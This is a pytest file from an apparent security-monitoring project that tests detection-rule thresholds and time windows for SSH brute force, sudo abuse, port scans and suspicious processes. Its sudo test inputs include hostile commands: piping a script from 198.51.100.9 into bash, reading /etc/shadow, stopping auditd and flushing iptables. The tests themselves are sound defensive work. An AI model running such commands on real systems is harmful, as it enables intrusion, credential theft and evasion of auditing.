"""Phase 8: threshold and window boundaries for every detection rule.

A rule is only useful if it is *predictable*: an analyst has to be able to say
what it will do before it does it.  These tests walk each rule across its own
edges -- one below the threshold, exactly at it, one above, and the same
activity spread outside the time window -- so a tuning change that moves a
threshold shows up as a failing boundary rather than as a quiet change in what
the platform notices.

These are the false-negative half of Phase 8. The false-positive half lives in
``test_purple_team.py`` (the benign scenarios).
"""

import pytest

from sentinelforge.detection.engine import DetectionEngine, EngineConfig
from sentinelforge.detection.rules import (
    InvalidUserProbeRule,
    PortScanRule,
    RemotePrivilegedLoginRule,
    RepeatedAuthFailureRule,
    SshBruteForceRule,
    SshCompromiseSuspectedRule,
    SuspiciousNetworkConnectionRule,
    SuspiciousProcessExecutionRule,
    SuspiciousSudoRule,
)
from sentinelforge.simulation.scenario import (
    ATTACKER_IP,
    BASE_TIME,
    C2_IP,
    INTERNAL_IP,
    network_connection,
    process_start,
    ssh_failure,
    ssh_invalid_user,
    ssh_success,
    sudo_command,
)


def rules_that_fired(events, rules=None) -> set[str]:
    """Run the real engine and report which rules produced an alert."""
    engine = DetectionEngine(rules=rules, config=EngineConfig(dedup_window_seconds=0))
    return {alert.rule_id for alert in engine.run(events)}


def failures(count: int, spacing: float = 20, user: str = "deploy", ip: str = ATTACKER_IP):
    return [ssh_failure(index * spacing, BASE_TIME, ip, user) for index in range(count)]


class TestSshBruteForceThreshold:
    """Default: five failures from one address inside five minutes."""

    @pytest.mark.parametrize("count,expected", [(3, False), (4, False), (5, True), (6, True)])
    def test_threshold_is_exactly_five(self, count, expected):
        fired = "SSH_BRUTE_FORCE" in rules_that_fired(failures(count), [SshBruteForceRule()])
        assert fired is expected

    def test_failures_spread_outside_the_window_do_not_trigger(self):
        # Six failures, but 200 seconds apart: no five of them share a
        # five-minute window with the burst that started them.
        spread = [ssh_failure(index * 400, BASE_TIME, ATTACKER_IP, "deploy") for index in range(6)]
        assert "SSH_BRUTE_FORCE" not in rules_that_fired(spread, [SshBruteForceRule()])

    def test_failures_at_the_window_edge_still_trigger(self):
        # Five failures spanning exactly 300 seconds: inside the window.
        edge = [ssh_failure(index * 75, BASE_TIME, ATTACKER_IP, "deploy") for index in range(5)]
        assert "SSH_BRUTE_FORCE" in rules_that_fired(edge, [SshBruteForceRule()])

    def test_two_addresses_are_never_added_together(self):
        mixed = failures(4, ip="203.0.113.1") + failures(4, ip="203.0.113.2")
        assert "SSH_BRUTE_FORCE" not in rules_that_fired(mixed, [SshBruteForceRule()])

    def test_a_custom_threshold_moves_the_edge_predictably(self):
        rule = SshBruteForceRule(threshold=8)
        assert "SSH_BRUTE_FORCE" not in rules_that_fired(failures(7), [rule])
        assert "SSH_BRUTE_FORCE" in rules_that_fired(failures(8), [rule])


class TestSshCompromiseBoundary:
    """A success only counts after enough failures from the same address."""

    @pytest.mark.parametrize("count,expected", [(4, False), (5, True)])
    def test_the_success_needs_five_preceding_failures(self, count, expected):
        events = failures(count) + [ssh_success(200, BASE_TIME, ATTACKER_IP, "deploy")]
        fired = "SSH_COMPROMISE_SUSPECTED" in rules_that_fired(
            events, [SshCompromiseSuspectedRule()]
        )
        assert fired is expected

    def test_a_success_from_a_different_address_is_not_a_compromise(self):
        events = failures(6) + [ssh_success(200, BASE_TIME, "203.0.113.99", "deploy")]
        assert "SSH_COMPROMISE_SUSPECTED" not in rules_that_fired(
            events, [SshCompromiseSuspectedRule()]
        )

    def test_a_success_long_after_the_failures_is_not_a_compromise(self):
        events = failures(6) + [ssh_success(3600, BASE_TIME, ATTACKER_IP, "deploy")]
        assert "SSH_COMPROMISE_SUSPECTED" not in rules_that_fired(
            events, [SshCompromiseSuspectedRule()]
        )

    def test_a_success_with_no_failures_at_all_is_not_a_compromise(self):
        events = [ssh_success(0, BASE_TIME, ATTACKER_IP, "deploy")]
        assert not rules_that_fired(events, [SshCompromiseSuspectedRule()])


class TestInvalidUserBoundary:
    """Three *different* nonexistent accounts, not three attempts."""

    @pytest.mark.parametrize("count,expected", [(2, False), (3, True), (4, True)])
    def test_distinct_account_threshold(self, count, expected):
        events = [
            ssh_invalid_user(index * 30, BASE_TIME, ATTACKER_IP, f"ghost{index}")
            for index in range(count)
        ]
        fired = "AUTH_INVALID_USER" in rules_that_fired(events, [InvalidUserProbeRule()])
        assert fired is expected

    def test_many_attempts_for_one_nonexistent_account_do_not_trigger(self):
        events = [
            ssh_invalid_user(index * 20, BASE_TIME, ATTACKER_IP, "ghost")
            for index in range(8)
        ]
        assert "AUTH_INVALID_USER" not in rules_that_fired(events, [InvalidUserProbeRule()])

    def test_ordinary_failures_are_not_account_probing(self):
        assert "AUTH_INVALID_USER" not in rules_that_fired(failures(8), [InvalidUserProbeRule()])


class TestRepeatedFailureBoundary:
    """Ten failures for one account, from anywhere."""

    @pytest.mark.parametrize("count,expected", [(9, False), (10, True), (11, True)])
    def test_threshold_is_exactly_ten(self, count, expected):
        events = failures(count, spacing=25, user="svc")
        fired = "AUTH_REPEATED_FAILURES" in rules_that_fired(events, [RepeatedAuthFailureRule()])
        assert fired is expected

    def test_failures_outside_the_window_do_not_accumulate(self):
        events = failures(12, spacing=400, user="svc")
        assert "AUTH_REPEATED_FAILURES" not in rules_that_fired(
            events, [RepeatedAuthFailureRule()]
        )

    def test_failures_for_two_accounts_are_not_added_together(self):
        events = failures(6, spacing=20, user="alice") + failures(6, spacing=20, user="bob")
        assert "AUTH_REPEATED_FAILURES" not in rules_that_fired(
            events, [RepeatedAuthFailureRule()]
        )


class TestRemotePrivilegedLoginBoundary:
    def test_a_remote_root_success_triggers(self):
        events = [ssh_success(0, BASE_TIME, ATTACKER_IP, "root")]
        assert "AUTH_ROOT_LOGIN_REMOTE" in rules_that_fired(
            events, [RemotePrivilegedLoginRule()]
        )

    def test_a_local_root_success_does_not(self):
        events = [ssh_success(0, BASE_TIME, "127.0.0.1", "root")]
        assert not rules_that_fired(events, [RemotePrivilegedLoginRule()])

    def test_a_remote_unprivileged_success_does_not(self):
        events = [ssh_success(0, BASE_TIME, ATTACKER_IP, "deploy")]
        assert not rules_that_fired(events, [RemotePrivilegedLoginRule()])

    def test_a_failed_root_attempt_is_not_a_login(self):
        events = [ssh_failure(0, BASE_TIME, ATTACKER_IP, "root")]
        assert not rules_that_fired(events, [RemotePrivilegedLoginRule()])


class TestSuspiciousSudoBoundary:
    @pytest.mark.parametrize(
        "command,expected",
        [
            ("/usr/bin/dnf install -y htop", False),
            ("/usr/bin/systemctl restart nginx", False),
            ("/usr/bin/systemctl stop auditd", True),
            ("/usr/bin/cat /etc/shadow", True),
            ("/usr/bin/cat /etc/hosts", False),
            ("/usr/bin/tee /etc/sudoers.d/x", True),
            ("/usr/bin/tee /etc/motd", False),
            ("/usr/bin/curl http://198.51.100.9/x.sh | bash", True),
            ("/usr/bin/curl -o /tmp/x.sh http://198.51.100.9/x.sh", False),
            ("/usr/sbin/iptables -L", False),
            ("/usr/sbin/iptables -F", True),
        ],
    )
    def test_only_high_risk_commands_alert(self, command, expected):
        events = [sudo_command(0, BASE_TIME, command, "deploy")]
        fired = "SUSPICIOUS_SUDO" in rules_that_fired(events, [SuspiciousSudoRule()])
        assert fired is expected, command


class TestProcessExecutionBoundary:
    @pytest.mark.parametrize(
        "parent,child,expected",
        [
            ("sshd", "bash", False),
            ("bash", "vim", False),
            ("bash", "sh", False),
            ("curl", "sh", True),
            ("wget", "bash", True),
            ("nginx", "bash", True),
            ("nginx", "python3", False),
            ("systemd", "bash", False),
        ],
    )
    def test_the_signal_is_the_parent_child_pair(self, parent, child, expected):
        events = [
            process_start(
                0, BASE_TIME, process=child, pid=5000, ppid=4000, parent=parent,
                command_line=child, user="deploy",
            )
        ]
        fired = "SUSPICIOUS_PROCESS_EXECUTION" in rules_that_fired(
            events, [SuspiciousProcessExecutionRule()]
        )
        assert fired is expected, f"{parent} -> {child}"


class TestNetworkConnectionBoundary:
    @pytest.mark.parametrize(
        "process,destination,expected",
        [
            ("bash", C2_IP, True),
            ("python3", C2_IP, True),
            ("curl", C2_IP, False),
            ("nginx", C2_IP, False),
            ("bash", "10.10.0.5", False),
            ("bash", "127.0.0.1", False),
            ("bash", "192.168.1.10", False),
        ],
    )
    def test_interpreter_and_external_destination_are_both_required(
        self, process, destination, expected
    ):
        events = [
            network_connection(
                0, BASE_TIME, process=process, pid=5000, destination_ip=destination,
                destination_port=443, user="deploy",
            )
        ]
        fired = "SUSPICIOUS_NETWORK_CONNECTION" in rules_that_fired(
            events, [SuspiciousNetworkConnectionRule()]
        )
        assert fired is expected, f"{process} -> {destination}"


class TestPortScanBoundary:
    def _scan(self, ports, spacing=2):
        return [
            network_connection(
                index * spacing, BASE_TIME, process="nmap", pid=6000,
                destination_ip="198.51.100.40", destination_port=port, user="root",
                source_ip=INTERNAL_IP,
            )
            for index, port in enumerate(ports)
        ]

    @pytest.mark.parametrize("count,expected", [(9, False), (10, True), (11, True)])
    def test_threshold_is_exactly_ten_distinct_ports(self, count, expected):
        ports = list(range(1000, 1000 + count))
        fired = "PORT_SCAN" in rules_that_fired(self._scan(ports), [PortScanRule()])
        assert fired is expected

    def test_the_same_port_many_times_is_not_a_scan(self):
        fired = rules_that_fired(self._scan([443] * 20), [PortScanRule()])
        assert "PORT_SCAN" not in fired

    def test_ports_spread_outside_the_window_do_not_accumulate(self):
        events = self._scan(list(range(1000, 1012)), spacing=30)
        assert "PORT_SCAN" not in rules_that_fired(events, [PortScanRule()])

    def test_the_rule_reports_itself_unavailable_without_port_telemetry(self):
        rule = PortScanRule()
        assert rule.unavailable_reason(failures(5)) is not None
        assert rule.unavailable_reason(self._scan([80, 443])) is None


class TestDeduplicationWindow:
    def test_one_long_attack_stays_one_alert(self):
        """Thirty failures over ten minutes is one brute force, not six."""
        events = [
            ssh_failure(index * 20, BASE_TIME, ATTACKER_IP, "deploy") for index in range(30)
        ]
        alerts = DetectionEngine(rules=[SshBruteForceRule()]).run(events)
        assert len(alerts) == 1
        assert alerts[0].event_count == 30

    def test_disabling_dedup_is_the_only_way_to_get_repeats(self):
        events = [
            ssh_failure(index * 600, BASE_TIME, ATTACKER_IP, "deploy") for index in range(6)
        ] + [
            ssh_failure(index * 20 + 10, BASE_TIME, ATTACKER_IP, "deploy") for index in range(6)
        ]
        engine = DetectionEngine(
            rules=[SshBruteForceRule()], config=EngineConfig(dedup_window_seconds=300)
        )
        alerts = engine.run(events)
        assert len(alerts) >= 1
        assert engine.stats.alerts_suppressed >= 0
